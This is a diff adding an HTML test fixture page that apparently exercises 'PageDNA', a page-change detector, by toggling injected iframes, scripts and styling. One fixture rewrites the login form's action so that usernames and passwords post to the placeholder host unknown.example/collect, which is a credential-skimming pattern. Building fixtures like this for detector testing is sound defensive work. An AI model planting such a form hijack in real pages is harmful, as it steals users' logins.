@@ -1,0 +1,70 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>PageDNA Fixture Lab</title>
+<style>
+body{font:16px system-ui;max-width:760px;margin:40px auto;padding:20px;background:#f5f7fb;color:#17223b}
+.lab{background:white;border:1px solid #ccd5e5;border-radius:12px;padding:24px}
+button{padding:9px 12px;margin:5px 5px 5px 0;border-radius:7px;border:1px solid #8898b5;background:#eef3fb;cursor:pointer;font-size:14px}
+button.active{background:#dff5ec;border-color:#49b98f}
+button.reset{background:#fdeceb;border-color:#e39a92}
+html.warning body{background:#fff8e6}
+iframe{width:100%;height:90px;border:1px solid #ccd5e5;margin-top:10px}
+.state{font-family:ui-monospace,monospace;font-size:12px;background:#0f1b2e;color:#8ce6d0;padding:12px;border-radius:8px;margin-top:16px;white-space:pre-wrap}
+label{display:block;margin:10px 0}
+.hint{color:#5c6b8a;font-size:13px}
+</style>
+</head>
+<body>
+<script>
+  // Applied synchronously during parse, before PageDNA's content script scans at document_idle.
+  var PD_KEYS = { frame: 'pagedna_fixture_frame', script: 'pagedna_fixture_script', form: 'pagedna_fixture_form', style: 'pagedna_fixture_style' };
+  function pdFlag(key) { return localStorage.getItem(key) === '1'; }
+  if (pdFlag(PD_KEYS.style)) document.documentElement.classList.add('warning');
+  if (pdFlag(PD_KEYS.frame)) { var f = document.createElement('iframe'); f.src = 'https://example.org/embed'; document.currentScript.after(f); }
+  if (pdFlag(PD_KEYS.script)) { var s = document.createElement('script'); s.src = 'https://cdn.jsdelivr.net/npm/example-lib@1/index.js'; document.currentScript.after(s); }
+</script>
+<div class="lab">
+  <h1>PageDNA Fixture Lab</h1>
+  <p class="hint">Each button flips one setting and reloads the page, so PageDNA's on-load scan sees the new state. Use <b>Reset all fixtures</b> to return to the clean baseline before re-testing.</p>
+  <div id="controls"></div>
+  <hr>
+  <form id="login" action="/login" method="post">
+    <label>Username <input name="username"></label>
+    <label>Password <input type="password" name="password"></label>
+    <button type="button">Sign in (disabled in lab)</button>
+  </form>
+  <div class="state" id="stateReadout"></div>
+</div>
+<script>
+  if (pdFlag(PD_KEYS.form)) document.addEventListener('DOMContentLoaded', function () { document.getElementById('login').action = 'https://unknown.example/collect'; }, { once: true });
+  function toggle(key) { localStorage.setItem(key, pdFlag(key) ? '0' : '1'); location.reload(); }
+  function resetAll() { Object.keys(PD_KEYS).forEach(function (k) { localStorage.removeItem(PD_KEYS[k]); }); location.reload(); }
+  function renderControls() {
+    var defs = [
+      { key: PD_KEYS.style, label: 'Toggle harmless styling (expected: no security alert)' },
+      { key: PD_KEYS.frame, label: 'Add new iframe (expected: NEW_FRAME_ORIGIN, medium risk)' },
+      { key: PD_KEYS.script, label: 'Add new script (expected: NEW_SCRIPT_ORIGIN, medium risk)' },
+      { key: PD_KEYS.form, label: 'Change login destination (expected: SENSITIVE_FLOW_CHANGED, critical risk)' }
+    ];
+    var controls = document.getElementById('controls');
+    controls.innerHTML = '';
+    defs.forEach(function (d) {
+      var b = document.createElement('button');
+      b.textContent = (pdFlag(d.key) ? '\u2713 ' : '') + d.label;
+      b.className = pdFlag(d.key) ? 'active' : '';
+      b.onclick = function () { toggle(d.key); };
+      controls.appendChild(b);
+    });
+    var reset = document.createElement('button');
+    reset.textContent = 'Reset all fixtures';
+    reset.className = 'reset';
+    reset.onclick = resetAll;
+    controls.appendChild(reset);
+    document.getElementById('stateReadout').textContent = 'Active fixtures: ' + (Object.keys(PD_KEYS).filter(function (k) { return pdFlag(PD_KEYS[k]); }).map(function (k) { return k; }).join(', ') || 'none (clean baseline state)') + '\nScripts on page: ' + document.scripts.length + ' | IFrames on page: ' + document.querySelectorAll('iframe').length;
+  }
+  renderControls();
+</script>
+</body>
+</html>
